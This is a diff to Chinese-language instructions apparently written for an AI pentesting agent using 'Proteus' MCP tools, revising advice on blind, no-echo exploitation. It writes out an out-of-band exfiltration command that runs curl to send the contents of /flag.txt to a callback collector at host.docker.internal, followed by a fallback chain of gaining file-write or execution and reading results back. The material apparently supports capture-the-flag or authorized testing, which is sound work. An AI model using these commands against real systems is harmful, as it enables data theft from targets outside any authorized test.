@@ -36,13 +36,16 @@
    `report_gen`（markdown），必要时用 `pentest_reflect` 反思沉淀技能；
    需要看本会话的明细时用 `pentest_evidence`（不传参列最近任务）。
 8. **盲打（零回显）用标准外带原语 `oob_read`，不要反复试错外带假设**：
-   首调 `oob_read` 在 127.0.0.1:<port> 起回调收集器 → 载荷里让目标回连
-   （容器内 curl / wget / python urllib 均可：
-   `curl 'http://127.0.0.1:<port>/x?data='$(cat /flag.txt)`）→ 再调
-   `oob_read` 收回调明细（路径/查询串/UA）。若目标出不了网或无回连原语，
-   再退回固定三步：① gadget 拿"写文件/执行"原语；② 写到**已知可读通道**
-   （侦察发现的留言板/上传/静态目录，或 Web 根）；③ 用已知路由读回。
-   两条路都不通才考虑别的假设，不要在未被验证的通道上反复烧调用。
+   首调 `oob_read` 起回调收集器 → 载荷里让目标回连 **callback.primary**
+   ——注意目标在 Docker 容器里时必须用 `host.docker.internal:<port>`
+   （容器里的 127.0.0.1 是容器自己，回连打不进宿主！），同宿主进程才用
+   `127.0.0.1:<port>`；容器内 curl / wget / python urllib 均可：
+   `curl 'http://host.docker.internal:<port>/x?data='$(cat /flag.txt)` →
+   再调 `oob_read` 收回调明细（路径/查询串/UA）。若目标出不了网或无回连
+   原语，再退回固定三步：① gadget 拿"写文件/执行"原语；② 写到**已知
+   可读通道**（侦察发现的留言板/上传/静态目录，或 Web 根）；③ 用已知
+   路由读回。两条路都不通才考虑别的假设，不要在未被验证的通道上反复烧
+   调用。
 
 工具使用：
 - Proteus 工具在会话中以前缀 `mcp__proteus__` 出现（如 `mcp__proteus__pentest_run`）。
